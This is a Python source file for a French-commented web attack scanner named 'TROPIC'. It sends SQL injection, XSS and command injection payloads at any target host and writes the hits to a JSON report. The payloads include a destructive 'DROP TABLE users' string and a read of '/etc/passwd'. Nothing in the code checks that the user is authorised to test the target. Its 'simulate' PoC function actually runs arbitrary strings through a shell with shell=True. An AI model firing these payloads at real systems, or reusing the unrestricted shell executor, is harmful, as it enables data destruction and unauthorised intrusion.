# Exploit_Adv.py - Version Avanc√©e TROPIC üå¥
# Mode r√©el pour pentest web avanc√©, logs temps r√©el, rapports JSON

import subprocess
import time
import random
import json
import os
import requests
from urllib.parse import urljoin, urlencode
import string
import threading

# ===============================================================================
#                             CONFIGURATION GLOBALE
# ===============================================================================

DEFAULT_TIMEOUT = 7  # Timeout HTTP par d√©faut
MAX_THREADS = 5      # Threads simultan√©s pour scan endpoints
HEADERS = {
    "User-Agent": "TROPIC-Exploit-Scanner/3.0 (EthicalHacking)"
}
OUTPUT_DIR = "output"

# Types de vuln√©rabilit√©s possibles
VULN_TYPES = ["SQLi", "XSS", "RCE", "Command Injection", "InfoLeak"]

# ===============================================================================
#                       FONCTIONS UTILITAIRES
# ===============================================================================

def mkdir_safe(path):
    if not os.path.exists(path):
        os.makedirs(path)

def random_string(length=6):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def http_request_safe(url, method="GET", timeout=DEFAULT_TIMEOUT, headers=None):
    try:
        if headers is None:
            headers = HEADERS
        resp = requests.request(method, url, timeout=timeout, headers=headers)
        return resp.status_code, resp.text
    except requests.Timeout:
        return 504, "Timeout"
    except requests.ConnectionError:
        return 0, "ConnectionError"
    except Exception as e:
        return 500, str(e)

# ===============================================================================
#                     GENERATEUR DE LOGS / VULN SCAN
# ===============================================================================

def run_vulnerability_scan(target, config):
    """
    G√©n√©rateur de scan vuln√©rabilit√©s avanc√©es.
    Retourne des logs √©tape par √©tape.
    """
    mkdir_safe(OUTPUT_DIR)
    detected_vulns = []

    # ---------------------------------------------------------------------------
    # 1. D√©tection des endpoints expos√©s
    # ---------------------------------------------------------------------------
    endpoints = ["/login", "/api", "/admin", "/config", "/search"]
    yield "[STATE]1/5 - Scan des endpoints critiques"

    for ep in endpoints:
        url = urljoin(f"https://{target}", ep)
        status, _ = http_request_safe(url)
        if status == 200:
            detected_vulns.append({
                "severity": "MEDIUM",
                "target": url,
                "title": f"Endpoint expos√© d√©tect√© : {ep}",
                "remediation": "Restreindre l'acc√®s ou authentification obligatoire",
                "type": "Endpoint Exposure"
            })
            yield f"[VULN DETECTED] Endpoint expos√© {url}"
        else:
            yield f"[SAFE] Endpoint {url} non expos√© (Status: {status})"

        time.sleep(0.2)

    # ---------------------------------------------------------------------------
    # 2. Test d'injection SQL / XSS sur endpoints actifs
    # ---------------------------------------------------------------------------
    yield "[STATE]2/5 - Test d'injection SQL/XSS"
    payloads = {
        "SQLi": ["' OR '1'='1", "'; DROP TABLE users; --"],
        "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
    }

    for vuln_type, plist in payloads.items():
        for ep in endpoints:
            url = urljoin(f"https://{target}", ep)
            for p in plist:
                test_url = f"{url}?q={urlencode({'input':p})}"
                status, resp_text = http_request_safe(test_url)
                # D√©tection basique : injection r√©ussie si payload refl√©t√©
                if p in resp_text:
                    detected_vulns.append({
                        "severity": "HIGH" if vuln_type=="SQLi" else "MEDIUM",
                        "target": test_url,
                        "title": f"{vuln_type} d√©tect√© sur {ep}",
                        "remediation": f"Sanitize input / Prepared statements pour {vuln_type}",
                        "type": vuln_type
                    })
                    yield f"[VULN DETECTED] {vuln_type} sur {test_url}"
                else:
                    yield f"[SAFE] {vuln_type} non d√©tect√© sur {test_url}"
                time.sleep(0.1)

    # ---------------------------------------------------------------------------
    # 3. Tests Command Injection simples
    # ---------------------------------------------------------------------------
    yield "[STATE]3/5 - Test Command Injection"
    cmd_payloads = ["; ls", "&& whoami", "| cat /etc/passwd"]
    for ep in endpoints:
        url = urljoin(f"https://{target}", ep)
        for cmd in cmd_payloads:
            test_url = f"{url}?cmd={urlencode({'input': cmd})}"
            status, resp_text = http_request_safe(test_url)
            if "root" in resp_text or "uid=" in resp_text:
                detected_vulns.append({
                    "severity": "CRITICAL",
                    "target": test_url,
                    "title": "Command Injection d√©tect√©e",
                    "remediation": "D√©sactiver l'ex√©cution de commandes depuis l'input utilisateur",
                    "type": "Command Injection"
                })
                yield f"[VULN DETECTED] Command Injection sur {test_url}"
            else:
                yield f"[SAFE] Command Injection non d√©tect√©e sur {test_url}"
            time.sleep(0.1)

    # ---------------------------------------------------------------------------
    # 4. Rapport final
    # ---------------------------------------------------------------------------
    mkdir_safe(OUTPUT_DIR)
    report_file = os.path.join(OUTPUT_DIR, f"{target}_vulnerability_report.json")
    with open(report_file, "w") as f:
        json.dump({"vulnerabilities": detected_vulns}, f, indent=4)

    yield f"[STATE]5/5 - Scan termin√©. {len(detected_vulns)} vuln√©rabilit√©s d√©tect√©es. Rapport: {report_file}"
    yield "[SCAN COMPLETE] Scan termin√© avec succ√®s."

# ===============================================================================
#                     EXECUTION REELLE PoC
# ===============================================================================
def simulate_poc_execution(target, command, force_real=True):
    """
    Ex√©cute un PoC/local command ou effectue une requ√™te HTTP si l'entr√©e est une URL.
    - Si `command` ressemble √† une URL (commence par http:// ou https://), on fera une requ√™te GET vers cette URL.
    - Sinon, on ex√©cutera la commande en local (subprocess).
    Retourne: (full_output_text, status_code)
      200 -> success, 400 -> non-zero exit, 404 -> not found, 408 -> timeout, 500 -> internal error
    """
    import subprocess
    from datetime import datetime

    # petit logger internal si utile (ne l√®ve pas d'erreur si absent)
    def _log(msg):
        try:
            globals().get("log_event", lambda x: None)(msg)
        except Exception:
            pass

    _log(f"[POC] simulate_poc_execution called | target={target} | cmd={command[:200]} | force_real={force_real}")

    if not command or not command.strip():
        return "[AUCUNE COMMANDE] Aucune commande fournie.", 200

    cmd_str = command.strip()
    lowered = cmd_str.lower()

    # Si la saisie est une URL -> GET distant (safe)
    if lowered.startswith("http://") or lowered.startswith("https://"):
        try:
            # Preferred: requests
            try:
                import requests
                resp = requests.get(cmd_str, timeout=15, headers={"User-Agent": "TROPIC-PoC/1.0"})
                body = resp.text or ""
                status_code_http = resp.status_code
                out = []
                out.append(f"[REMOTE HTTP GET] URL: {cmd_str}")
                out.append(f"[REMOTE STATUS] HTTP {status_code_http}")
                out.append("--- RESPONSE BODY START ---")
                out.append(body if body else "<no body>")
                out.append("--- RESPONSE BODY END ---")
                status_code = 200 if 200 <= status_code_http < 300 else 400
                _log(f"[POC-REMOTE] {cmd_str} -> HTTP {status_code_http}")
                return "\n".join(out), status_code
            except Exception:
                # Fallback to urllib if requests unavailable
                from urllib.request import urlopen, Request
                from urllib.error import URLError, HTTPError
                req = Request(cmd_str, headers={"User-Agent": "TROPIC-PoC/1.0"})
                with urlopen(req, timeout=15) as resp:
                    body = resp.read().decode(errors='ignore')
                    status_code_http = getattr(resp, "status", 200)
                    out = []
                    out.append(f"[REMOTE HTTP GET] URL: {cmd_str}")
                    out.append(f"[REMOTE STATUS] HTTP {status_code_http}")
                    out.append("--- RESPONSE BODY START ---")
                    out.append(body if body else "<no body>")
                    out.append("--- RESPONSE BODY END ---")
                    status_code = 200 if 200 <= status_code_http < 300 else 400
                    _log(f"[POC-REMOTE-URLOPEN] {cmd_str} -> HTTP {status_code_http}")
                    return "\n".join(out), status_code
        except HTTPError as he:
            msg = f"[REMOTE ERROR] HTTPError: {he.code} - {str(he)}"
            _log(msg)
            return msg, 404
        except URLError as ue:
            msg = f"[REMOTE ERROR] URLError: {str(ue)}"
            _log(msg)
            return msg, 408
        except Exception as e:
            _log(f"[POC-REMOTE-EXC] {e}")
            return f"[CRITICAL ERROR] Erreur lors de la requ√™te HTTP: {e}", 500

    # Sinon => ex√©cution locale (shell)
    try:
        result = subprocess.run(
            cmd_str,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            check=False
        )

        out_lines = []
        out_lines.append(f"[LOCAL EXEC] Commande: {cmd_str}")
        out_lines.append(f"[LOCAL RETCODE] {result.returncode}")
        if result.stdout and result.stdout.strip():
            out_lines.append("--- STDOUT ---")
            out_lines.append(result.stdout.strip())
        if result.stderr and result.stderr.strip():
            out_lines.append("--- STDERR ---")
            out_lines.append(result.stderr.strip())

        # Optional: info locale suppl√©mentaire si fonction disponible
        try:
            if "detect_local_privileges" in globals():
                try:
                    is_root, user, id_text = globals()["detect_local_privileges"]()
                    out_lines.append("--- PRIV INFO (LOCAL HOST) ---")
                    out_lines.append(f"user: {user}")
                    out_lines.append(f"id output: {id_text}")
                except Exception:
                    pass
        except Exception:
            pass

        status_code = 200 if result.returncode == 0 else 400
        _log(f"[POC-LOCAL] cmd='{cmd_str}' rc={result.returncode}")
        full = "\n".join(out_lines)
        return full, status_code

    except subprocess.TimeoutExpired:
        msg = f"[TIMEOUT] La commande '{cmd_str}' a d√©pass√© le d√©lai autoris√© (30s)."
        _log(msg)
        return msg, 408
    except FileNotFoundError:
        msg = f"[ERROR] Commande introuvable : '{cmd_str}'"
        _log(msg)
        return msg, 404
    except Exception as e:
        _log(f"[CRITICAL] {e}")
        return f"[CRITICAL ERROR] Erreur inattendue lors de l'ex√©cution : {e}", 500
